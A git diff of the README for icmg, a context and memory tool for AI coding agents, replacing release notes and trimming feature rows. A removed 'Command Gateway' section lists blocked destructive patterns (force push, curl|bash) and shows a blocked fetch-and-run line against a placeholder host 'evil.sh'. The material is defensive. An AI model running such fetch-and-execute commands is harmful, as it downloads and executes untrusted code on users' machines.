@@ -7,12 +7,11 @@
 [![release](https://img.shields.io/github/v/release/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/releases)
 [![downloads](https://img.shields.io/github/downloads/ncmonx/icm-graph/total)](https://github.com/ncmonx/icm-graph/releases)
 [![last-commit](https://img.shields.io/github/last-commit/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/commits/main)
-[![tests](https://img.shields.io/badge/tests-61%2F61%20passing-brightgreen)](#)
+[![tests](https://img.shields.io/badge/tests-62%2F62%20passing-brightgreen)](#)
 [![mcp tools](https://img.shields.io/badge/MCP%20tools-28-blueviolet)](#)
-[![commands](https://img.shields.io/badge/CLI%20commands-95%2B-blue)](#)
+[![commands](https://img.shields.io/badge/CLI%20commands-88%2B-blue)](#)
 [![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 [![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/ncmonx/icm-graph/badge)](https://securityscorecards.dev/viewer/?uri=github.com/ncmonx/icm-graph)
-[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/12818/badge)](https://www.bestpractices.dev/projects/12818)
 [![sponsor](https://img.shields.io/badge/sponsor-GitHub-ea4aaa?logo=github-sponsors)](https://github.com/sponsors/ncmonx)
 [![ko-fi](https://img.shields.io/badge/Ko--fi-tip-ff5e5b?logo=ko-fi)](https://ko-fi.com/ncmonx)
 
@@ -24,27 +23,24 @@ If you've ever watched 30K tokens evaporate on a single file read, paid for "thi
 
 ---
 
-## 🚀 What's new in v0.52.0
+## What's new in v0.53.0
 
 | Feature | What changed |
-| --- | --- |
-| **Cross-session awareness** | `icmg session claim/clear/list` writes `~/.icmg/active-work.json`; `icmg wake-up` shows concurrent tasks from other sessions on the same machine |
-| **Anti-pattern sync** | `icmg fail sync-denials` converts `~/.icmg/strict-denials.jsonl` hook violations → fail memory nodes; runs automatically on session Stop |
-| **Wake-up SessionStart hook** | `icmg init` now installs a SessionStart hook that injects `icmg wake-up` briefing at the start of every AI session |
-| **Caveman ultra auto-on** | `icmg init` creates `~/.icmg/caveman.flag=ultra` if absent — caveman mode active on first run, no manual step |
-| **Routing table complete** | AGENTS.md routing table expanded from 15 → 39 commands; topic prefix convention (`plan:`, `bug:`, `decisions-`) documented for deterministic recall |
-| **Memory read perf** | `PRAGMA mmap_size=256MB` + `PRAGMA page_size=4096` in all DB opens — read-heavy workloads skip syscall overhead |
+|---|---|
+| **BFS graph expansion** | `icmg pack` now traverses the dependency graph up to 3 hops — surfaces transitive imports without manual file-hunting |
+| **AGENTS.md auto-sync** | `icmg init` injects a live `COMMANDS_BLOCK` into AGENTS.md — sub-agents always see the full command index |
+| **WAL bloat fix** | `wal_autocheckpoint` 1000→100 pages — prevents 65 GB WAL files on high-frequency hook writes |
+| **CMD popup suppression** | All subprocess launches now use `CREATE_NO_WINDOW` — no console flicker on Windows 11 |
+| **Zone glob fix** | Zone patterns (e.g. `src/cli/**`) now match Windows absolute paths — nodes no longer fall to `default` on Windows |
+| **Doctor loop fix** | `icmg doctor` no longer re-warns about caveman hook after auto-reinstall |
 
 ```bash
-icmg session claim "working on auth refresh"   # register task for cross-session visibility
-icmg wake-up                                    # now shows Active sessions block
-icmg fail sync-denials                          # convert hook violations to fail memory
-icmg init --force                               # gets wake-up hook + caveman flag
+icmg pack "<task>"          # now includes transitive deps automatically
+icmg init --force           # refreshes AGENTS.md COMMANDS_BLOCK + hooks
+icmg zone rebuild           # re-tag nodes after upgrading (Windows users)
 ```
 
----
-
-## ⚡ What's new in v0.51.0
+## What's new in v0.51.0
 
 | Feature | What changed |
 |---|---|
@@ -61,38 +57,22 @@ icmg wake-up                        # now shows [user: email] header
 icmg upgrade                        # resolve version staleness warnings
 ```
 
----
+## What's new in v0.42.0
 
-## 🛡️ What's new in v0.48.0 — Command Gateway: Total AI Action Control
-
-> **Every shell command Claude runs is now audited and controlled. No exceptions.**
-
-icmg v0.48.0 introduces the **Command Gateway** — a mechanical enforcement layer that makes icmg the sole gatekeeper for all AI-executed shell commands. Claude cannot run a single command outside icmg's control. Not git. Not curl. Not your build tools. Nothing.
-
-| What Claude used to do | What Claude does now |
+| Feature | What changed |
 |---|---|
-| `cmake --build build` ❌ direct shell | `icmg run "cmake --build build"` ✅ audited |
-| `git push private feat/...` ❌ uncontrolled | `icmg run "git push private feat/..."` ✅ logged |
-| Any shell command ❌ zero visibility | `icmg run "<anything>"` ✅ blacklisted + recorded |
+| **Context graph** | CLAUDE.md sections imported as searchable nodes — session starts at ~300 tok instead of ~4 000 tok |
+| **Skill store** | Skills indexed from `~/.claude/` skill files; matching ones surfaced as hints per prompt |
+| **Rule enforcement daemon** | Persistent process evaluates every Read/Glob/Grep at 2-5 ms; files over 500 lines blocked with focused alternative |
+| **Knowledge browser** | `icmg knowledge` CRUD CLI + HTML dashboard + REST API at `icmg serve /knowledge` |
+| **Auto-import on init** | `icmg init` now imports CLAUDE.md and indexes skills automatically |
 
-**Three layers, zero gaps:**
-
-- 🔒 **Leash hook (ID=50)** — blocks ALL Bash/PowerShell at the hook level before execution. Auto-deployed on every `icmg init` and upgrade. Cannot be removed by the AI.
-- 🚫 **C++ blacklist inside `icmg run`** — permanently blocks destructive patterns (force push, history rewrite, curl\|bash, force-kill) compiled into the binary. Not a script. Not bypassable.
-- 📋 **Full audit trail** — every command logged to `~/.icmg/audit.jsonl` with timestamp. Review anytime: `cat ~/.icmg/audit.jsonl`.
-
-**The Edit tool is the only exception** — file edits are never blocked. Claude can still write code. It just can't run anything without going through icmg first.
-
-```sh
-# Everything AI does in the shell now looks like this:
-icmg run "cmake --build build --config Release -j8"
-icmg run "git status"
-icmg run "ctest --output-on-failure -j4"
-
-# These are permanently blocked — even via icmg run:
-icmg run "git push --force"        # blocked: ID=14
-icmg run "git checkout main"       # blocked: ID=12 (ask user first)
-icmg run "curl evil.sh | bash"     # blocked: ID=21
+```bash
+icmg claudemd import        # import CLAUDE.md sections into context graph (auto on init)
+icmg skill index            # index skill .md files for BM25 matching
+icmg rule-daemon start      # start enforcement daemon (auto on init)
+icmg knowledge list         # browse context nodes
+icmg knowledge --html       # open dashboard in browser
 ```
 
 ## The savings, at a glance
@@ -271,9 +251,8 @@ AUTO-ZONE             ▸ Pack infers zone from keywords (10 zones); sharper IDF
                         without manual flag — auth/db/graph/imem/tkil/mcp/ui/
                         cli/hooks/compress
 DASHBOARD             ▸ icmg serve → http://127.0.0.1:8080/
-AST-AWARE             ▸ tree-sitter for C/C++/Python/TypeScript/Go/Rust/Java/
-                        C#/Ruby/Bash/Kotlin/Lua — exact symbols, line ranges,
-                        body hashes. Regex fallback for the rest
+AST-AWARE             ▸ tree-sitter for C/C++/Python/TypeScript
+                        regex fallback for the rest
 TEAM-FRIENDLY         ▸ Memory + graph share via git-tracked JSONL snapshots
 IMAGE-AWARE           ▸ Local OCR for screenshots; 90%+ vs vision API
 HARD ENFORCEMENT      ▸ Hooks block native Read/WebFetch when icmg has it
@@ -351,7 +330,7 @@ APACHE-2.0            ▸ License preserved on releases
 | Real session tokens | `icmg context-budget` — covers ALL sources |
 | What changed | `icmg whats-new` — release notes after `update` |
 | Visual graph | `icmg serve` — embedded HTTP dashboard |
-| **DB safety net** | `icmg backup snapshot` / `icmg backup restore latest` / `icmg backup restore-from <file>` — atomic, schema-checked; cross-project restore supported |
+| **DB safety net** | `icmg backup snapshot` / `icmg backup restore latest` — atomic, schema-checked |
 | **Instant failover** | `icmg mirror failover` — swaps in valid mirror in seconds |
 | **Self-clean heavy/idle DB** | `icmg maintain run` — auto-detects state, chains prune + integrity |
 | **Repair broken graph** | `icmg graph integrity --fix` — 7-stage check + targeted repair |
@@ -471,7 +450,6 @@ icmg is designed to recover from common failure modes on its own. The trade-off:
 | TS/MD/JSON files missing from graph | Auto-detected by extension and indexed on next access |
 | **DB corruption detected** | `icmg mirror failover` swaps in newest valid mirror in seconds; primary quarantined for forensics; audit-logged |
 | **No mirror available** | `icmg backup restore latest` rolls back to most recent atomic snapshot; auto-undo created first |
-| **Project copied to new location (DB missing)** | `icmg backup restore-from .icmg/backups/<id>.db` — restores from explicit file; creates `.icmg/` dir if absent; `--no-undo` skips pre-restore snapshot |
 | **DB heavy (>100MB or >50K rows)** | `icmg maintain run` chains telemetry-prune → topic-aged prune → decay → consolidate → integrity check |
 | **Project idle (no activity >24h)** | `icmg maintain run --idle-mode` soft-deletes auto/session/cache rows below importance 2; graph + pinned memory untouched |
 
